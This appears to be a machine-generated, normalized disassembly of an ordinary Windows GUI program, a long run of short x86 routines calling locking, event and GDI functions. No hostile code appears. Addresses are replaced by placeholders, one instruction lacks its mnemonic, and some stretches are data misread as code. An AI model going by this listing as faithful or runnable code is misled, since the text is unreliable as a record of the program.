retn
sub_416d3c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416d8c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_416f77
jmp sub_4039d0
sub_416f7e
mov esp ebp
pop ebp
retn
sub_417028
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
retn
sub_4170b0
mov [ eax + 0x18 ] edx
retn
sub_41722c
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410d54
retn
sub_4172b3
jmp sub_4039d0
sub_4172ba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417366
jmp sub_4039d0
sub_41736d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417511
jmp sub_4039d0
sub_417563
jmp sub_4039d0
sub_417582
jmp sub_4039d0
sub_417589
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175a8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4175a1
jmp sub_4039d0
sub_4175a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41764b
jmp sub_4039d0
sub_4176d3
jmp sub_4039d0
sub_4176e0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
pop ebx
retn
sub_4176f8
mov eax [ rw-data ]
call sub_4176e0
retn
sub_417730
push ebx
call sub_410bb8
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4176f8
sub_41789d
jmp sub_4039d0
sub_4178a4
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404050
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4179c4
jmp sub_4039d0
sub_4179cb
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417ac2
jmp sub_4039d0
sub_417adf
jmp sub_4039d0
sub_417ae6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417be4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41662c
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_417ca8
push ebx
mov ebx eax
mov eax ebx
call sub_41965c
cmp al 0x9
sete al
pop ebx
retn
sub_417d07
jmp sub_4039d0
sub_417d0e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_417db4
jmp sub_4039d0
sub_417dbb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41803a
jmp sub_40371c
sub_418066
jmp sub_40371c
sub_418108
jmp sub_40371c
sub_4181ab
jmp sub_40371c
sub_418383
jmp sub_40371c
sub_4183c5
jmp sub_4039d0
sub_4183f5
jmp sub_4039d0
sub_4183fc
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41846b
jmp sub_4039d0
sub_418542
jmp sub_4039d0
sub_418549
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41881c
mov dl 0x1
call sub_417784
retn
sub_41895d
jmp sub_4039d0
sub_418964
pop ebx
mov esp ebp
pop ebp
retn
sub_41896c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41976c
mov eax [ rw-data ]
call sub_4176e0
pop ebp
retn
j_sub_403848#8
jmp sub_403848
sub_418b0d
jmp sub_403848
sub_418b58
jmp sub_4039d0
sub_418b5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c3f
jmp sub_4039d0
sub_418c46
mov esp ebp
pop ebp
retn
sub_418cfe
jmp sub_4039d0
sub_418d05
pop ecx
pop ecx
pop ebp
retn
sub_419007
jmp sub_4039d0
sub_41900e
pop ebx
mov esp ebp
pop ebp
retn
sub_4192b3
jmp sub_4039d0
sub_4192ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403294
retn
sub_4192d3
jmp sub_4039d0
sub_4192f7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_40371c
sub_41932e
jmp sub_40371c
sub_41936d
jmp sub_4039d0
sub_419374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419396
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404074
retn
sub_41938f
jmp sub_4039d0
sub_419396
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41941d
jmp sub_40371c
sub_41944a
jmp sub_4039d0
sub_419451
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41945c
push ecx
mov edx esp
mov ecx 0x4
call sub_417c20
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_4176e0
sub_419569
jmp sub_4039d0
sub_419570
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41964f
jmp sub_4039d0
sub_419656
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4196ac
jmp sub_4039d0
sub_4196b3
pop ebx
pop ecx
pop ebp
retn
sub_4198fb
jmp sub_4039d0
sub_419902
pop ecx
pop ecx
pop ebp
retn
sub_419945
jmp sub_4039d0
sub_41994c
pop ebx
pop ecx
pop ebp
retn
sub_4199e8
jmp sub_4039d0
sub_4199ef
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419a9d
jmp sub_4039d0
sub_419aa4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419ab0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_419d0b
jmp sub_4039d0
sub_419d12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d37
mov eax [ ebp - 0x8 ]
call sub_403294
mov eax [ ebp - 0x4 ]
call sub_403294
retn
sub_419d30
jmp sub_4039d0
sub_419d37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d5c
lea eax [ ebp - 0x1c ]
call sub_40568c
lea eax [ ebp - 0x18 ]
call sub_404050
retn
sub_419d55
jmp sub_4039d0
sub_419d5c
pop ebx
mov esp ebp
pop ebp
retn
sub_419f6e
jmp sub_4039d0
sub_419f75
pop ebx
mov esp ebp
pop ebp
retn
sub_419fc8
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_416890
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419fe0
test dl dl
je r-xdata
mov dl 0x8
call sub_41a164
retn
mov dl 0x9
call sub_41a164
retn
sub_41a068
mov dl 0x1
call sub_41a164
retn
sub_41a070
xor edx edx
call sub_41a164
retn
sub_41a155
jmp sub_4039d0
sub_41a15c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a178
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cb00
sub_41a1ac
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41a1c4
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41a1d0
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41a1c4
sub_41a1ec
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_41a1f8
push rw-data
call InterlockedIncrement
retn
sub_41a204
push rw-data
call InterlockedDecrement
retn
sub_41a31a
jmp sub_40371c
sub_41a349
jmp sub_4039d0
sub_41a37f
jmp sub_4039d0
sub_41a386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3a5
push rw-data
call LeaveCriticalSection
retn
sub_41a39e
jmp sub_4039d0
sub_41a3a5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3f1
jmp sub_40371c
sub_41a502
jmp sub_4039d0
sub_41a509
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a590
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_41a870
sub_41a60a
jmp sub_4039d0
sub_41a611
pop ebx
mov esp ebp
pop ebp
retn
sub_41a630
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41a644
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_41a630
call sub_41a7c4
sub_41a769
jmp sub_4039d0
sub_41a770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a78f
push rw-data
call LeaveCriticalSection
retn
sub_41a788
jmp sub_4039d0
sub_41a78f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_41a7a6
jmp sub_4039d0
sub_41a7ec
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_41a870
call sub_41a804
jmp r-xdata
sub_41a851
jmp sub_40371c
sub_41a898
mov [ eax + 0xd ] 0x1
retn
sub_41aa08
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41abe4
sub_41aa68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41876c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41aa7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41876c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41aa90
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419ff4
retn
sub_41aa9c
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419ff4
retn
sub_41ad44
xor eax eax
retn
sub_41ad48
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41ad50
xor eax eax
retn
sub_41ad54
retn
sub_41ad58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040a4
pop esi
pop ebx
retn
sub_41ad6c
mov eax [ eax + 0x4 ]
retn
sub_41ad70
retn
sub_41ad74
xor eax eax
retn
sub_41ad78
retn
sub_41ad7c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_41ad88
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41ad94
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41ada0
retn
sub_41ada4
xchg edx eax
call sub_418410
retn
sub_41adac
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41ae34
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403490
pop esi
retn
sub_41ae48
retn
sub_41af28
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040a4
pop esi
pop ebx
retn
sub_41af68
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41b0b4
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034c4
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41b0cc
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41b154
retn
sub_41b19c
retn
sub_41b1d4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41b1ec
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41b410
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403490
pop esi
pop ebx
retn
sub_41b234
mov al 0x1
retn
sub_41b238
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41b240
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41b2e8
xor eax eax
retn
sub_41b2ec
retn
sub_41b318
retn
sub_41b3b0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41b3c4
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_414014
retn
sub_41b50b
jmp sub_40371c
sub_41b510
mov ebx 0x1
call sub_403a84
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b573
jmp sub_40371c
sub_41b578
mov ebx 0x80030103
call sub_403a84
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b5f6
jmp sub_40371c
sub_41b5fb
mov ebx 0x80030009
call sub_403a84
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41b659
jmp sub_40371c
sub_41b65e
mov ebx 0x8000ffff
call sub_403a84
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b829
jmp sub_4039d0
sub_41b83a
jmp sub_40371c
sub_41b83f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b868
lea eax [ ebp + 0xc ]
call sub_40568c
retn
sub_41b861
jmp sub_4039d0
sub_41b868
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41b874
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41b880
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41b88c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41b898
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41b907
jmp sub_40371c
sub_41b90c
mov esi 0x8000ffff
call sub_403a84
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b920
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41b98d
jmp sub_4039d0
sub_41b994
mov eax [ rw-data ]
call sub_403294
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41b9a4
call sub_413960
retn
sub_41ba6c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41bc10
jmp sub_4039d0
sub_41bc17
pop ebp
retn
sub_41bca5
jmp sub_4039d0
sub_41bcac
pop ebp
retn
sub_41bf65
jmp sub_4039d0
sub_41bf6c
pop ebp
retn
sub_41bf70
sub [ rw-data ] 0x1
retn
sub_41c3a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
retn
sub_41c545
retn 0x41
sub_41c7f1
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
xchg [ esp ] eax
retn
sub_41c7fe
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
sub_41c80b
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41cc28
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41cc9c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41cd10
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41cd1c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41cdfc
jmp sub_4039d0
sub_41ce03
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ce93
jmp sub_4039d0
sub_41cf25
jmp sub_4039d0
sub_41cf2c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cf90
jmp sub_4039d0
sub_41cf97
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cfff
jmp sub_4039d0
sub_41d006
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d0a9
jmp sub_4039d0
sub_41d0b0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d508
push 0x33
mov ecx rw-data
call sub_413c20
retn
sub_41d518
push 0x33
mov ecx rw-data
call sub_413be0
retn
sub_41d528
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41d54c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41d720
push 0x11
mov ecx rw-data
call sub_413be0
retn
sub_41d860
push ebx
mov ebx eax
mov eax ebx
call sub_41d528
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41d91a
jmp sub_4039d0
sub_41d921
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41d937
jmp sub_4039d0
sub_41d950
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d9ad
jmp sub_4039d0
sub_41d9b4
pop ebx
pop ecx
pop ebp
retn
sub_41db2d
jmp sub_4039d0
sub_41db55
jmp sub_4039d0
sub_41db5c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41dbc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4042b4
pop esi
pop ebx
retn
sub_41dc3c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41db98
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41dc78
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41dcb0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41dce0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41ddfe
jmp sub_4039d0
sub_41de05
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41de1b
jmp sub_4039d0
sub_41de91
jmp sub_4039d0
sub_41de98
pop ebx
pop ecx
pop ebp
retn
sub_41de9c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41df52
jmp sub_4039d0
sub_41df64
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403490
sub_41df78
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41dfa8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41e0b7
jmp sub_4039d0
sub_41e0be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d54c
retn
sub_41e0d4
jmp sub_4039d0
sub_41e14d
jmp sub_4039d0
sub_41e154
pop ebx
pop ecx
pop ebp
retn
sub_41e285
jmp sub_4039d0
sub_41e298
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41e5d8
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41e7ec
jmp sub_4039d0
sub_41e7f3
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41e7fc
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41e834
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e840
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41e980
retn
sub_41ea49
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41ea60
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41eb4c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41eb6c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41eb8c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41ebac
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
pop ebx
retn
sub_41ebc4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
pop ebx
retn
sub_41ebe8
mov eax [ rw-data ]
call sub_41ebc4
retn
sub_41ec3e
jmp sub_4039d0
sub_41ec45
pop ecx
pop ebp
retn
sub_41ece4
jmp sub_4039d0
sub_41eceb
pop ebx
mov esp ebp
pop ebp
retn
sub_41edbd
jmp sub_4039d0
sub_41ee4e
jmp sub_4039d0
sub_41ee55
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ee80
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41ef67
jmp sub_4039d0
sub_41f114
jmp sub_4039d0
sub_41f11b
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41f32d
jmp sub_4039d0
sub_41f334
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41f3ce
jmp sub_4039d0
sub_41f5aa
jmp sub_4039d0
sub_41f664
jmp sub_4039d0
sub_41f66b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f68b
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f684
jmp sub_4039d0
sub_41f68b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41f819
jmp sub_4039d0
sub_41f9e4
jmp sub_4039d0
sub_41f9eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa0e
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402704
retn
sub_41fa07
jmp sub_4039d0
sub_41fa0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa2e
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402704
retn
sub_41fa27
jmp sub_4039d0
sub_41fa2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41fb80
push 0x0
call sub_41fb1c
retn
sub_41fc25
jmp sub_4039d0
sub_41fc2c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41fc38
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41fb88
pop ebx
pop ebp
retn 0x4
sub_41fc4c
retn
sub_41fc50
test eax eax
jne r-xdata
retn
call sub_41fc4c
sub_41fe23
jmp sub_4039d0
sub_41fe4a
jmp sub_4039d0
sub_41fe51
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe90
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_42005d
mov eax [ ebp - 0xc ]
call sub_403294
retn
sub_420066
jmp sub_4039d0
j_sub_42005d
jmp sub_42005d
sub_42006d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
retn
sub_420083
jmp sub_4039d0
sub_420094
xor eax eax
retn
sub_420098
mov al [ eax + 0x21 ]
retn
sub_4200e4
jmp sub_4039d0
sub_4200eb
pop esi
pop ecx
pop ebp
retn
sub_420118
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42016f
jmp sub_4039d0
sub_420176
pop esi
pop ecx
pop ebp
retn
sub_42017c
retn
sub_420180
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420190
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_4202ae
jmp sub_4039d0
sub_4202d6
jmp sub_4039d0
sub_4202dd
mov esp ebp
pop ebp
retn
sub_420354
jmp sub_4039d0
sub_42045c
jmp sub_4039d0
sub_420547
jmp sub_4039d0
sub_420554
inc [ eax + 0x4 ]
retn
sub_4206cf
jmp sub_4039d0
sub_420a80
jmp sub_4039d0
sub_420cca
jmp sub_4039d0
sub_420cf4
jmp sub_4039d0
sub_420cfb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d1d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_420d16
jmp sub_4039d0
sub_420d27
jmp sub_40371c
sub_420d76
jmp sub_4039d0
sub_420fa3
jmp sub_4039d0
sub_420feb
jmp sub_4039d0
sub_421158
jmp sub_4039d0
sub_42121f
jmp sub_40371c
sub_421274
mov [ eax + 0x31 ] 0x0
call sub_41fe90
retn
sub_4214c5
jmp sub_4039d0
sub_421530
jmp sub_4039d0
sub_421537
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4215a8
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_42165c
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_42166c
push ebx
mov ebx eax
mov eax ebx
call sub_421824
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_421680
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_42169c
push ebx
mov ebx eax
mov eax ebx
call sub_421884
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4216f8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_421807
jmp sub_4039d0
sub_421a6b
jmp sub_40371c
sub_421acb
jmp sub_4039d0
sub_421ad2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_421eb3
jmp sub_4039d0
sub_421edf
jmp sub_4039d0
sub_421f46
jmp sub_40371c
sub_421f77
jmp sub_4039d0
sub_421ffc
jmp sub_40371c
sub_422001
mov eax [ ebp - 0x38 ]
call sub_403294
call sub_403a30
call sub_403a84
sub_422013
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422030
mov eax [ ebp - 0x18 ]
call sub_402704
retn
sub_422029
jmp sub_4039d0
sub_42217f
jmp sub_40371c
sub_42244b
jmp sub_40371c
sub_4224dc
mov cl 0x1
call sub_4224e4
retn
